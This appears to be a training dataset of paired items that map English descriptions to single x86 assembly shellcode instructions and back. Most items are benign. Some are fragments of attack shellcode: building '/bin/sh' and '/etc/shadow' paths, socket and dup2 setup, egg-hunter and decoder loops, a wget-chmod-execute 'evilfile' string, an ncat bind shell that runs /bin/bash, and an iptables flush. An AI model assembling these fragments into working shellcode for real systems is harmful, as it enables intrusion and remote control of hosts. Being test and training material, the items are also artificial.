ShellCodeGen: move the contents of dl into the byte at the memory location specified by the operation [esi+1],"mov byte [esi + 1], dl"
ShellCodeSum: jz find_egg,jump to the find_egg label if the zero flag is set
ShellCodeGen: push the word 0x3436 onto the stack,push word 0x3436
"ShellCodeSum: sub bl, 48",subtract the decimal value 48 from the nl register
ShellCodeGen: move sock_reg into ebx,"mov ebx, sock_reg"
"ShellCodeSum: mov eax, 102",invoke sys_socketcall
ShellCodeGen: jump to the shift_decode label if the zero flag is set,jz shift_decode
"ShellCodeSum: mov dl, byte [eax + 1]",move the byte at the address [eax + 1] into dl
ShellCodeSum: push dword 0x6164732f,push the dword 0x6164732f onto the stack
ShellCodeGen: make the system call for exit,"mov eax, 1"
"ShellCodeSum: push 15 \n mov ecx, esp",push the value 15 onto the stack and point ecx to the stack register
ShellCodeGen: move the contents of the esi register into the long starting at the address [esi+22],"mov long [esi+22], esi"
ShellCodeGen: push 0x2 to the stack,push 0x2
ShellCodeGen: perform a logical xor between the byte at the address speicified by [esi + ecx - 1] and the bh register and save the result in [esi + ecx - 1],"xor byte [esi + ecx - 1], 0x3"
ShellCodeSum: db 10,declare a byte with no label containing the value 10
"ShellCodeSum: mov dword [ebx], 2",move the 32-bit integer representation of 2 into the doubleword starting at the address in ebx
ShellCodeGen: jump to the label exit_on_error if the contents of the eax register is not zero,"test eax, eax \n jnz exit_on_error"
ShellCodeSum: push ebx,push the contents of ebx register onto the stack
ShellCodeGen: push the 0x64777373 onto the stack,push 0x64777373
ShellCodeGen: make the system call to copy the file descriptor,"mov eax, 63"
"ShellCodeSum: mov al, byte 66h",move the byte 66h into al
ShellCodeGen: if equal jump to label continue,je continue
ShellCodeSum: push 0x6769666e,push 0x6769666e onto the stack
ShellCodeGen: move the contents of the bl register into the contents of the cl register then subtract the value 1 from the cl register and jump to the loop label if the result is not zero,"mov cl, bl \n sub cl, 1 \n jnz loop"
ShellCodeGen: make the system call getpid,"mov eax, 20"
"ShellCodeSum: xor bx, bx",initialize bx to 0
ShellCodeGen: system call exit,"mov eax, 1"
ShellCodeGen: if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the search_the_egg label else jump to the eax register,"cmp DWORD [eax], edx \n jne search_the_egg \n jmp eax"
ShellCodeGen: push the byte 0x06 onto the stack,push byte 0x06
ShellCodeGen: load the effective address [ebp-8] into ebx,"lea ebx, [ebp-8]"
"ShellCodeSum: mov eax, 67",install portable signal handler
ShellCodeGen: compare the byte at the address esi and 0xd,"cmp byte [esi], 0xd"
ShellCodeSum: stc,set carry flag
ShellCodeGen: put the syscall 0x04 into the eax register,push byte 0x04 \n pop eax
ShellCodeGen: push the byte 0x2f onto the stack,push byte 0x2f
ShellCodeSum: jmp short call_decoder,jump short to the call_decoder label
"ShellCodeSum: mov eax, 1",make the system call for exit
ShellCodeSum: pop [ebx],pop the top element of the stack into memory at the four bytes starting at location ebx
"ShellCodeSum: cmp byte [esi], 0xD \n jl wrap_around \n sub byte [esi], 0xD",jump to the wrap_around label if the byte starting at the address contained in the esi register is lower than the byte value 0xD else subtract the byte value 0xD from byte starting at the address contained in the esi register
ShellCodeGen: define the byte string '/sbin/iptables#-f#',db '/sbin/iptables#-f#'
ShellCodeGen: push the dword 0x73656c62 onto the stack,push dword 0x73656c62
ShellCodeGen: jump to the label _recv_http_request if the contents of the eax register is not zero else subtract the value 0x6 from the contents of the ecx register,"test eax, eax \n jnz _recv_http_request \n sub ecx, 0x6"
ShellCodeSum: push 0x68737a2f,push 0x68737a2f onto the stack
"ShellCodeSum: xor ecx, ecx \n mul ecx",zero out the eax register and the ecx register
ShellCodeGen: jump short to the label socket if the contents of the eax register is negative,"test eax, eax \n js short socket"
ShellCodeGen: push 0x2 onto the stack,push 0x2
"ShellCodeSum: cmp al, 9 \n jg l1",jump to the label l1 if the contents of the al register is greater than the decimal value 9
ShellCodeSum: jmp two,jump to the two label
"ShellCodeSum: push 0x6374652f \n mov edx, esp",push the value 0x6374652f onto the stack and point edx to the stack register
"ShellCodeSum: mov bl, 0xff",move 0xff into bl
"ShellCodeSum: sub esp, 12",subtract 12 from the contents of the esp register
ShellCodeSum: section .data,section for initialized data
ShellCodeGen: jump to the carryon label,jmp carryon
ShellCodeGen: perform a logical xor between the byte at the address specified by [esi] and the cl register and save the result in [esi],"xor byte [esi], cl"
"ShellCodeSum: mov cx, 0700",move 0700 into cx
ShellCodeSum: dec ecx \n jns loop,decrement the contents of the ecx register and jump to the loop label if the result is not negative
"ShellCodeSum: push 0x61702f2f \n push 0x6374652f \n mov edi, esp",push the value 0x61702f2f and the value 0x6374652f onto the stack and point the edi register to the stack register
ShellCodeGen: put the syscall 0x2f into the eax register,push byte 0x2f \n pop eax
ShellCodeGen: subtract the contents of al register from the contents of dl register and save the result in dl,"sub dl, al"
ShellCodeGen: move the 4th element of the array word_table into cx,"mov cx, word_table[3]"
"ShellCodeSum: xor edx, edx",set the contents of edx to zero
ShellCodeGen: put the syscall 11 into the eax register,push byte 11 \n pop eax
ShellCodeGen: zero out the eax and edx register,"xor edx, edx \n mul edx"
"ShellCodeSum: push 0x2f2f2f2f \n mov edx, esp",push the value 0x2f2f2f2f onto the stack and point edx to the stack register
ShellCodeSum: jnz exit_on_error,jump to the exit_on_error label if the zero flag is cleared
ShellCodeGen: subtract one from the contents of ebx,dec ebx
"ShellCodeSum: mov byte [esp+2], 0x07",move 0x07 into the byte at address [esp+2]
"ShellCodeSum: mov al, 54",move 54 into al
ShellCodeGen: sigaction,push byte 0x43
ShellCodeGen: increment the contents of the cl register,inc cl
"ShellCodeSum: mov al, 0x66",make the socketcall
ShellCodeGen: call the near function,call near stageaddress
ShellCodeGen: jump short to the decode label if the zero flag is cleared,jnz short decode
ShellCodeGen: move the address of environment variable into edx,"mov edx, environment"
ShellCodeGen: define the _parent label,_parent:
ShellCodeSum: jmp callpop,jump to the callpop label
ShellCodeGen: push 0x61622f2f onto the stack,push 0x61622f2f
"ShellCodeSum: mov dl, 0x1c",move 0x1c into dl
"ShellCodeSum: cmp ecx, ebp",compare the contents of the ecx register with the contents of the ebp register
ShellCodeSum: not ax,negate all the bits of the ax register
ShellCodeSum: push 0x53534150,push the 0x53534150 onto the stack
ShellCodeGen: mul eax by ecx,mul ecx
ShellCodeSum: push 0x2e373231,push 0x2e373231 to the stack
ShellCodeGen: push the byte 0x4 onto the stack,push byte 0x4
ShellCodeSum: push dword 0x2,push the double word 2 onto the stack
"ShellCodeSum: mov eax, 0x2e323931",move 0x2e323931 into eax
"ShellCodeSum: test si, 01h",perform and operation between si and 01h
ShellCodeSum: stage:,declare the stage label
ShellCodeGen: decrement the ecx register by one,dec ecx
"ShellCodeSum: line db '/usr/bin/wget http://127.0.0.1:8080/evilfile && /bin/chmod 777 evilfile && ./evilfile', 0x0a","define line as the byte string '/usr/bin/wget http://127.0.0.1:8080/evilfile && /bin/chmod 777 evilfile && ./evilfile', 0x0a"
ShellCodeSum: three:,declare the three label
ShellCodeGen: compare if edi is equal to 0,"cmp edi, 0"
ShellCodeGen: push the doubleword 0x2f2f6e69 to the stack,push dword 0x2f2f6e69
ShellCodeGen: multiply the value of eax by 2,"shl eax, 1"
ShellCodeGen: move donelen into edx,"mov edx, donelen"
ShellCodeGen: return,ret
ShellCodeGen: define even_number function,even_number:
"ShellCodeSum: cmp bl, 78h \n jge short loc_402B1D",jump to the memory location loc_402B1D if the contents of the bl register is greater than or equal to the value 78h
"ShellCodeSum: xor ecx, dh",perform a logical xor between the ecx register and the dh register and save the result in ecx
ShellCodeGen: push 0x6374652f to the stack,push 0x6374652f
ShellCodeGen: make space on stack,"sub esp, 4"
"ShellCodeSum: mov eax, [ebx]",move the 4 bytes in memory at the address contained in ebx into eax
ShellCodeSum: a_letter db 'd',allocate one byte of memory for a_letter variable and initialize it to 'd'
ShellCodeGen: increment the contents of the edx register,inc edx
ShellCodeGen: call the _printf function,call _printf
ShellCodeGen: left rotate the byte at the address esi by 0x2 bits,"rol byte [esi], 0x2"
ShellCodeGen: jump to the stage label if the zero flag is cleared,jnz stage
ShellCodeGen: add 0x40 to the al register,"add al, 0x40"
ShellCodeGen: move bx into ax,"mov ax, bx"
"ShellCodeSum: add ecx, 16",add 16 to ecx
"ShellCodeSum: add eax, [ebp-4]",add the contents of the local variable stored at ebp-4 into eax
ShellCodeGen: push 0x782f2f32 onto the stack,push 0x782f2f32
"ShellCodeSum: mov dword [esp-8], 0x68732f2f",move 0x68732f2f into the dword at address [esp-8]
"ShellCodeSum: mov esi, esp",move esp into esi
ShellCodeGen: subtract the byte in esi from the bl register,"sub bl,byte [esi]"
ShellCodeSum: pop cx,restore the top of the stack into the cx register
ShellCodeGen: call sys_read to fill the buffer,int 80h
ShellCodeGen: jump to the download label if the zero flag is set,jz download
"ShellCodeSum: add al, 0x40",add 0x40 to the al register
ShellCodeGen: push the byte 0x5 onto the stack and point ebx to the stack register,"push byte 0x5 \n mov ebx, esp"
ShellCodeGen: decrement the ecx register and jump to the L2 label if the contents of the ecx register is not zero and the zero flag is zero else push the contents of the eax register onto the stack,loopnz L2 \n push eax
ShellCodeSum: here:,define here label
ShellCodeGen: make the system call to install portable signal handler,"mov eax, 67"
"ShellCodeSum: mov byte al, 0x0b",move 0x0b into the byte at address al
ShellCodeSum: push len,push len onto the stack
ShellCodeSum: push word 0xb315,push the word 0xb315 onto the stack
ShellCodeSum: jz download,jump to the download label if the zero flag is set
ShellCodeSum: jmp edi,jump to edi
ShellCodeSum: push dword 0x64616568,push the dword 0x64616568 onto the stack
ShellCodeGen: replaces the contents of the edi register with its two's complement,neg edi
ShellCodeGen: push the value 0x64687373 onto the stack and point the ebp register to the stack register,"push 0x64687373 \n mov ebp, esp"
ShellCodeGen: invoke sys_read,"mov eax, 3"
ShellCodeSum: push 0x636e2f2f,push 0x636e2f2f onto the stack
ShellCodeSum: two:,define two label
ShellCodeGen: declare a byte with no label containing the value 10,db 10
"ShellCodeSum: cmp al, cl \n jne short decode \n jmp shellcode",jump short to the decode label if the contents of the al register is not equal to the contents of the cl register else jump to the shellcode label
"ShellCodeSum: mov ebx, 0xfee1dead",move the value 0xfee1dead into the ebx register
ShellCodeGen: declare the next_cycle label,next_cycle:
ShellCodeSum: push byte 0x30 \n pop eax,put the syscall 0x30 into the eax register
"ShellCodeSum: cmp BYTE al, 2 \n je do_inject",if the byte representation of 2 is equal to the contents of the al register then jump to the label do_inject
"ShellCodeSum: xchg esi, eax",swap the contents of the esi register with the contents of the eax register
ShellCodeSum: array word 20,define an array of 20 initialized word
ShellCodeSum: neg eax,negate eax
ShellCodeGen: perform xor operation between eax and eax,"xor eax, eax"
"ShellCodeSum: sub esp, 4",allocate memory for a variable
ShellCodeGen: push 0x782f6e69 to the stack,push 0x782f6e69
ShellCodeGen: add byte '0' to al,"add al, byte '0'"
ShellCodeGen: push the contents of the edx register onto the stack and point ecx to the stack register,"push edx \n mov ecx, esp"
ShellCodeGen: move 876189623 into edi,"mov edi, 876189623"
"ShellCodeSum: mov eax, 19",make the system call lseek
"ShellCodeSum: mov eax, buff",move buff to eax
ShellCodeSum: pop ebx,remove last character from the stack into ebx
"ShellCodeSum: push dword 0x74652f2f \n mov eax, esp",push double word 0x74652f2f onto the stack and point the eax register to the stack register
"ShellCodeSum: loop fill \n mov ecx, esp",decrement the ecx register and jump to the fill label if the contents of the ecx register is not zero else move the contents of the esp register into the ecx register
ShellCodeGen: move 0x1ff into cx,"mov cx, 0x1ff"
ShellCodeSum: push dword ebx,push the doubleword ebx to the stack
ShellCodeSum: call _write,call the _write function
ShellCodeSum: call _continue,call _continue
ShellCodeSum: mul ebx,mul eax by ebx
ShellCodeGen: make the system call lseek,"mov eax, 19"
"ShellCodeSum: mov dl, byte [esi + 1]",move the singl byte at the memory location speicified by the operation [esi+1] into dl
"ShellCodeSum: db 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b","define an array of bytes and initialize it to 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b"
ShellCodeGen: load the effective address of the operation [ebp+0x59] into the ebp register,"lea ebp,[ebp+0x59]"
ShellCodeGen: move 0x1 into lower byte of the eax register,"mov al, 0x01"
ShellCodeGen: move the value in ecx into eax,"mov eax, ecx"
"ShellCodeSum: shl eax, 1",multiply eax by 2 using left shift
ShellCodeGen: push 0x2f6e6962 onto the stack,push 0x2f6e6962
ShellCodeGen: perform a logical xor between the eax register and the edi register and save the result in eax,"xor eax, edi"
ShellCodeGen: push ecx to the stack,push ecx
ShellCodeSum: push 0x7361702f,push 0x7361702f to the stack
ShellCodeGen: add 0x10 to eax,"add eax, 0x10"
ShellCodeSum: push 0x73644d24,push 0x73644d24 onto the stack
"ShellCodeGen: define line as the byte string '/usr/bin/wget http://127.0.0.1:8080/evilfile && /bin/chmod 777 evilfile && ./evilfile', 0x0a","line db '/usr/bin/wget http://127.0.0.1:8080/evilfile && /bin/chmod 777 evilfile && ./evilfile', 0x0a"
"ShellCodeSum: mov eax, parentmsg",move parentmsg into eax
ShellCodeGen: define createfile function,createfile:
"ShellCodeSum: cmp bl, 0x1f \n jb 0xf3 \n add al, 0x40",if the unsigned contents of the bl register is lower than the unsigned value 0x1f then jump to the memory address 0xf3 else add the 0x40 value to the al register
ShellCodeGen: jump short to the read label,jmp short read
ShellCodeGen: move esi into ex,"mov ax, [esi]"
"ShellCodeSum: xor ax, ax",clear the ax register
ShellCodeGen: move the address of the character on the stack into ebx,"mov ebx, esp"
"ShellCodeSum: mov eax, [ebx+epi*4+2]",move the contents of memory address ebx+epi*4+2 into eax
ShellCodeSum: scasd \n jnz IncAddr,jump to the IncAddr label if the value in the eax register is not equal to the doubleword addressed by edi
ShellCodeGen: move readbuffer into edx,"mov edx, readbuffer"
ShellCodeGen: add 64 to the contents of the edx register,"add edx, 64"
ShellCodeGen: divide the contents of in eax by by the word value stored at memory location var,div dword [var]
ShellCodeGen: make syscall to output the text to stdout,int 80h
"ShellCodeSum: sub [var], esi",subtract the contents of esi from the 32-bit integer stored at memory location var
"ShellCodeSum: mov ecx, eax",move eax into ecx
"ShellCodeSum: mov byte [esi+7], al",move al into the byte at address [esi+7]
ShellCodeSum: push 0x6168732f,push the 0x6168732f onto the stack
ShellCodeSum: find_egg:,declare the find_egg label
"ShellCodeSum: loopnz L3 \n mov edx, 7",decrement the ecx register and jump to the L3 label if the contents of the ecx register is not zero and the zero flag is zero else move the value 7 into the edx register
"ShellCodeSum: xor ax, bx \n jz call_decoded",jump to the call_decoded label if the result of the logical xor between the ax register and the bx register is zero
"ShellCodeSum: sub eax, 8",subtract 8 from the contents of eax register and save the result in eax
ShellCodeGen: copy the value in var1 into the doubleword starting at the address in eax,"mov dword [eax], var1"
"ShellCodeSum: mov edi, 0xada67373",move 0xada67373 into edi
ShellCodeGen: jump to the find_egg label if the zero flag is set,jz find_egg
ShellCodeGen: push the word 0544o onto the stack,push word 0544o
ShellCodeGen: move the number of bytes of var4 into eax,"mov eax, type var4"
"ShellCodeSum: add bl, 0x2",add 0x2 to the contents in bl and save the result in bl
ShellCodeSum: push eax,push the value of register eax onto the stack
ShellCodeGen: define negative label,negative:
ShellCodeGen: move value the contents of memory address ebp+16 into edi,"mov edi, [ebp+16]"
"ShellCodeSum: sub al,0x13",subtract 0x13 from the al register
"ShellCodeSum: add edx, eax",add the contents of the eax register to the edx register
ShellCodeSum: push word 0666q,push the word 0666q onto the stack
ShellCodeGen: push 0x69622f65 to the stack,push 0x69622f65
ShellCodeSum: push 0x30313a31,push 0x30313a31 onto the stack
ShellCodeSum: push 0x69622f65,push 0x69622f65 to the stack
ShellCodeGen: push 0x2f3a706d onto the stack,push 0x2f3a706d
ShellCodeGen: subtract 8 from the contents of eax register and save the result in eax,"sub eax, 8"
ShellCodeGen: if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e then jump to the l2 label,"cmp BYTE [edx], 0x2e \n jne l2"
ShellCodeSum: push 0x636e2f2f,push 0x636e2f2f to the stack
"ShellCodeSum: mov eax, ecx",move the value in ecx into eax
ShellCodeSum: push byte 3h,push the byte 3h onto the stack
ShellCodeGen: move the value 0x2 into the cl register,"mov cl, 0x2"
ShellCodeSum: even_number:,define even_number function
ShellCodeGen: declare the loopinghere label,loopinghere:
ShellCodeGen: remove last character from the stack into edx,pop eax
"ShellCodeSum: xor eax, 0x58494741",perform the xor operation between eax and 0x58494741 value and store the result in eax
"ShellCodeSum: push long 0x68732f2f \n push long 0x6e69622f \n mov ebx, esp",move /bin/sh into the ebx register
ShellCodeSum: db '/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd',define the byte string '/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd'
"ShellCodeSum: sub esp, 8",subtract 8 from esp and save the result in esp
"ShellCodeSum: mov byte [var], 5",store the value 5 into the byte at memory location var
ShellCodeSum: push '/etc',push '/etc' onto the stack
ShellCodeGen: increment edx,inc edx
ShellCodeSum: jmp jocker,jump to the jocker label
ShellCodeGen: push the byte 11 onto the stack,push byte 11
ShellCodeGen: zero out the eax register,"xor eax, eax"
"ShellCodeSum: mov cx, 0x1ff",move 0x1ff into cx
ShellCodeSum: int 80h,make kernel call to display line string
"ShellCodeSum: mov dl,0x14",move 0x14 into dl
ShellCodeGen: divide eax by 2 using right shift,"shr eax, 1"
ShellCodeGen: pop doublewords from the stack into the 32 bit registers,popad
ShellCodeGen: push the byte 5 onto the stack,push byte 5
ShellCodeGen: declare the reading label,reading:
ShellCodeGen: move 0x2e383631 into eax,"mov eax, 0x2e383631"
"ShellCodeSum: cmp byte [buff], 7ah",compare the byte at the memory location buff with 7ah
ShellCodeGen: move esp into esi,"mov esi, esp"
"ShellCodeSum: mov al, byte[buff+ecx]",move a byte from the address buff+ecx into al
ShellCodeGen: define main_loop label,main_loop:
"ShellCodeSum: mov edx, buff",move buff to edx
ShellCodeGen: define the child function,child:
ShellCodeSum: end:,declare the end label
"ShellCodeSum: sub edi, 0x44444444",subtract 0x44444444 from edi and save the result in edi
ShellCodeSum: db 'egg mark',initialize a string to 'egg mark'
ShellCodeGen: jump to the exit label if the unsigned contents of the ebx register is greater than the unsigned value 10 else jump to the loop label,"cmp ebx, 9 \n ja exit \n jmp loop"
ShellCodeGen: restore ecx register,pop ecx
"ShellCodeSum: cmp bl, al \n je loop_2 \n jmp short not_found",jump to the loop_2 label if the contents of the bl register is equal to the contents of the al register else jump short to the not_found label
"ShellCodeSum: add byte [esi], 2",add the byte value 2 to the esi register
"ShellCodeSum: mov eax, 10",move 10 into eax
"ShellCodeSum: cmp eax, ebx \n je child",if the contents of the eax register is equal to the contents of the ebx register then jump to the child label
ShellCodeGen: jump to 0xd8 it the carry flag is zero,jnc 0xd8
"ShellCodeSum: cmp byte [esi], 0xD \n jle wrap_around",if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0xD then jump to the wrap_around label
"ShellCodeSum: xchg ebx, esp",swap the values of ebx and esp registers
ShellCodeGen: move ecx to edi,"mov edi, ecx"
"ShellCodeSum: mov ebx, eax",move the address in eax into ebx
"ShellCodeSum: mov ebx, 0x5",move 0x5 into ebx
"ShellCodeSum: mov al, 1",move 1 into al
ShellCodeGen: make the system call write,"mov eax, 4"
ShellCodeSum: push word 0x3636,push the word 0x3636 onto the stack
"ShellCodeSum: mov eax, 48",make the system call to install the signal handler
"ShellCodeSum: push 0x64687373 \n mov ebp, esp",push the value 0x64687373 onto the stack and point the ebp register to the stack register
ShellCodeSum: je done,jump to label done if equal
ShellCodeSum: push 0x6475732f,push the 0x6475732f onto the stack
ShellCodeGen: subtract 0x1525152a from the contents in ecx and save the result in ecx,"sub ecx, 0x1525152a"
ShellCodeSum: push dword 0x61747069,push the dword 0x61747069 onto the stack
"ShellCodeSum: mov ebx, 3",move 3 to the ebx register
ShellCodeGen: declare the decoder function,decoder:
"ShellCodeSum: sub ax, 1662",subtract 1662 from ax and save the result into ax
"ShellCodeSum: mov al, 0x2",put the syscall 0x2 into the al register
ShellCodeGen: subtract the contents of bx from the contents of dx,"sub dx, bx"
ShellCodeGen: push 1 to the stack,push 1
"ShellCodeSum: mov eax, ebx",copy the contents of ebx into eax register
ShellCodeGen: no operation,nop
ShellCodeGen: set eax to 0,"xor eax, eax"
"ShellCodeSum: mov ebx, 2",invoke subroutine bind
ShellCodeSum: push byte 54 \n pop eax,put the syscall 54 into the eax register
ShellCodeGen: declare next_addr function,next_addr:
ShellCodeSum: section .bss,declare section containing uninitialized data
"ShellCodeSum: push byte 1 \n mov eax, esp",push the byte 1 onto the stack and point eax to the stack register
ShellCodeGen: push the word 0x0a to the stack,push word 0x0a
ShellCodeSum: decoded_shellcode:,define decoded_shellcode function
ShellCodeGen: move shellcodelen into cl,"mov cl, shellcodelen"
ShellCodeSum: priv_setgid:,declare the priv_setgid label
"ShellCodeSum: cmp byte [esi], 0xd",compare the byte at the address esi and 0xd
ShellCodeSum: dec ecx \n jns dup2,decrement the contents of the ecx register and jump to the dup2 label if the result is not negative
ShellCodeGen: clear the eax register and push its contents onto the stack,"xor eax, eax \n push eax"
"ShellCodeSum: mov eax, 2",create a new process
"ShellCodeSum: mov edx, len",move variable len to edx
ShellCodeGen: perform xor operation between the value stored at the location ecx+116 and dh,"xor [ecx + 116], dh"
"ShellCodeSum: cmp eax, ebx \n je exit \n mov al, 0x4",if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label else move the value 0x4 into the al register
ShellCodeGen: push the word 0666q onto the stack,push word 0666q
ShellCodeGen: load the effective address of the result of the operation [zero_reg+66h] into the eax register,"lea eax, [zero_reg+66h]"
ShellCodeGen: divide ebx by 4 using right shift,"shr ebx, 2"
ShellCodeSum: push 0x64777373,push the 0x64777373 onto the stack
ShellCodeGen: push 0x61622f6e onto the stack,push 0x61622f6e
ShellCodeSum: main_loop:,define main_loop label
ShellCodeGen: move 20 into al,"mov al, 20"
"ShellCodeSum: xor [ecx], bh",perform the xor operation between the value stored at the location ecx and bh
"ShellCodeSum: mov eax, 0x563ed8b7",move 0x563ed8b7 into eax
ShellCodeGen: push the doubleword 0x8140a8c0 to the stack,push dword 0x8140a8c0
ShellCodeSum: push word 0x722d,push the word 0x722d onto the stack
"ShellCodeSum: pop ecx \n loop l2 \n mov eax, 1",restore the top of the stack into the ecx register then decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else make the system call exit
ShellCodeGen: compare if eax is zero,"cmp eax, 0"
ShellCodeGen: subtract 0x04baca01 from the contents in ecx and save the result in ecx,"sub ecx, 0x04baca01"
"ShellCodeSum: mov eax, [ebx+8]",copy the 4 byte at memory location specified by the the result of the operation ebx+8 into eax register
"ShellCodeSum: xor ebx, ebp",perform a logical xor between the ebx register and the ebp register and save the result in ebx
ShellCodeSum: dec ecx,decrement the ecx register by one
ShellCodeGen: compare the contents at memory location ebp+var_a with 0,"cmp [ebp+var_a], 0"
"ShellCodeSum: mov ax, [di]",copy thevalue at memory address specified by di into ax
ShellCodeGen: push 0x752f2f2f to the stack,push 0x752f2f2f
ShellCodeGen: move esi into eax,"mov eax, esi"
ShellCodeGen: reserve array realarray of 10 real numbers,realarray resq 10
ShellCodeSum: int 80h,make sys_exit kernel call
"ShellCodeSum: cmp ecx, 100",compare if our counter is equal to 100
"ShellCodeSum: test eax, eax \n js short socket",jump short to the label socket if the contents of the eax register is negative
"ShellCodeSum: add eax, 2",add 2 to the contents of the eax register
ShellCodeGen: left rotate the byte in esi 1 time,"rol byte [esi], 0x1"
ShellCodeSum: push byte 0x0b,push the byte 0x0b onto the stack
ShellCodeGen: move 3 into cl,"mov cl, 3"
"ShellCodeSum: add eax, esi",add the contents of esi to the contents of eax
ShellCodeGen: define string as the byte string '/bin/sh',string: db '/bin/sh'
"ShellCodeSum: mov edx, [z]",move the contents at memory address z to edx
ShellCodeGen: push /bin/sh into ebx,"mov ebx, esp"
ShellCodeSum: pop edi,restore the top of the stack into the edi register
ShellCodeGen: jump to the fillOnes label if the contents of the al register is equal to the value 0xf2,"cmp al, 0xf2 \n je fillOnes"
ShellCodeGen: define the byte addr and initialize it to 0x1,addr: db 0x1
ShellCodeGen: jump short to the memory location loc_40102B if the contents of the eax register is not equal to the contents of the ebp register,"cmp eax, ebp \n jnz short loc_40102B"
ShellCodeGen: move 16666 into dx,"mov dx, 16666"
ShellCodeGen: move the value 0x2a1 into the dx register,"mov dx, 0x2a1"
ShellCodeGen: define sys_execve equal to 0x0b,sys_execve equ 0x0b
"ShellCodeSum: add al, byte [edi]",add the byte in edi to the al register
ShellCodeGen: make the system call mmap,"mov eax, 90"
ShellCodeSum: code:,define the code label
ShellCodeGen: put syscall value into eax,pop eax
ShellCodeGen: jump to the label do_next_accept if the contents of the eax register is not zero,"test eax, eax \n jnz do_next_accept"
ShellCodeGen: jump to write if greater,ja write
ShellCodeGen: reset both lower and uppper bytes of ecx to be 0,"xor ecx, ecx"
ShellCodeGen: define the call_decoder label,call_decoder:
"ShellCodeSum: mov eax, [x]",move the contents at memory specified by x to eax
ShellCodeSum: push 0x7273752f,push 0x7273752f to the stack
"ShellCodeSum: add esi, 0x21354523",add 0x21354523 to the contents of esi
ShellCodeGen: load the effective address [esp+1] into ebx,"lea ebx, [esp +1]"
ShellCodeGen: push 0x682f2f2f onto the stack,push 0x682f2f2f
ShellCodeGen: if the contents of the al register is equal to 0xf2 then jump to the fillOnes label else move the value 0x59935193 into the eax register,"cmp al, 0xf2 \n je fillOnes \n mov eax, 0x59935193"
ShellCodeGen: point ebp to the esp register,"mov ebp, esp"
ShellCodeGen: perform and operation between eax and 40392b29 and save the result in eax,"and eax, 40392b29"
ShellCodeGen: subtract 0x7ff from the contents of cx register value and save the result in cx,"sub cx, 0x7ff"
ShellCodeSum: scasd,compare the value in the eax register to the doubleword addressed by the edi register
"ShellCodeSum: xor edx, edx",zero out the edx register
"ShellCodeSum: mov bl, 3 \n dec bl \n jnz l3",move the value 3 into the bl register then decrement the contents of the bl register and jump to the l3 label if the result is not zero
ShellCodeGen: move 0x243525f0 into esi,"mov esi, 0x243525f0"
ShellCodeGen: subtract the contents of the ecx register from the contents of the ecx register,"sub ecx, ecx"
ShellCodeGen: define the label 1,1:
ShellCodeGen: push the byte +0xb onto the stack,push byte +0xb
"ShellCodeSum: cmp dl, 1h",compare the contents of the dl register and 1h
ShellCodeGen: define the byte string '/bin/sh',db '/bin/sh'
ShellCodeGen: move the contents of the al register at the memory location specified by the operation [bp+0x07],"mov [bp+0x07], al"
"ShellCodeSum: xchg ebx, eax",swap the values of ebx and eax registers
"ShellCodeSum: mov cl, 0x1",move 0x1 into cl
ShellCodeSum: global _star,declare of the global _star
ShellCodeSum: var2 db ?,declare an uninitialized byte referred to as location var2
ShellCodeGen: push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the edx register to the stack register,"push dword 0x2f2f2f2f \n push dword 0x7273752f \n mov edx, esp"
ShellCodeGen: load the effective address of [esi + 1] into the edi register,"lea edi, [esi +1]"
ShellCodeGen: add the value 0x1b into the dx register,"add dx, 0x1b"
ShellCodeGen: move 66h into al,"mov al, 66h"
"ShellCodeSum: mov eax, 65",getpgrp
"ShellCodeSum: shl edx, 1",multiply edx by 2 using left shift
"ShellCodeSum: mov ebx, 9",move number 9 into ebx
ShellCodeGen: move the contents of memory address ebx+esi into eax,"mov eax, [ebx+esi]"
ShellCodeGen: move the contents at memory address temp3 to ecx,"mov ecx, [temp3]"
ShellCodeSum: next_cycle:,define next_cycle label
"ShellCodeSum: myList word 1,2,3,4,5","define myList array of word and initialize it to 1, 2, 3, 4, and 5"
ShellCodeGen: if the contents of the eax register is equal to the contents of the ebx register then jump to the child label,"cmp eax, ebx \n je child"
"ShellCodeSum: mov eax, [esp+4]",move the value of register at address esp+4 and store into eax
ShellCodeGen: perform the xor operation between eax and 0x58494741 value and store the result in eax,"xor eax, 0x58494741"
"ShellCodeSum: mov eax, 11",execve
ShellCodeGen: move the byte at the address 0ffh into dl,"mov dl, byte 0ffh"
ShellCodeGen: move 0x4 into ch,"mov ch, 0x4"
ShellCodeGen: move data at memory location a_letter into al,"mov al, a_letter"
ShellCodeGen: initialize eax with decimal value 0,"xor eax, eax"
"ShellCodeSum: sub eax, 0x3bd04ede",subtract 0x3bd04ede from the contents in eax and save the result in eax
"ShellCodeSum: mov al, 0xb5",move 0xb5 into al
ShellCodeGen: multiply the contents of eax by the 32-bit contents of the memory location var,mul [var]
ShellCodeSum: push byte 0x05,push the byte 0x05 onto the stack
"ShellCodeSum: mov ecx, esp",move the contents of the esp register into the ecx register
"ShellCodeSum: mov al, 4",store 4 into al
ShellCodeSum: jmp short path,jump short to the path label
ShellCodeSum: push ecx,push ecx to the stack
"ShellCodeSum: add ebx, 3",add 3 to the contents of the ebx register
"ShellCodeSum: test eax, eax \n js old_dirent",if the contents of the eax register is negative then jump to the label old_dirent
"ShellCodeSum: mov sock_reg, eax",move eax into sock_reg
"ShellCodeSum: mov ecx, msg",move the memory address of message string into ecx
ShellCodeGen: put the syscall 67 into the eax register,push byte 67 \n pop eax
ShellCodeSum: jmp short two,jump short to the two label
ShellCodeSum: push 0x66,push 0x66 to the stack
ShellCodeGen: move 0x2f3e20 into eax,"mov eax, 0x2f3e20"
ShellCodeGen: push the contents of edi register onto the stack,push edi
ShellCodeGen: push the value 12 onto the stack and point ebx to the stack register,"push 12 \n mov ebx, esp"
ShellCodeGen: swap the values of esp and esi registers,"xchg esp, esi"
ShellCodeGen: do nothing,nop
ShellCodeGen: write,"mov eax, 4"
ShellCodeGen: left shift eax by two bits,"shl eax,2"
ShellCodeGen: push the word 0xc005 to the stack,push word 0xc005
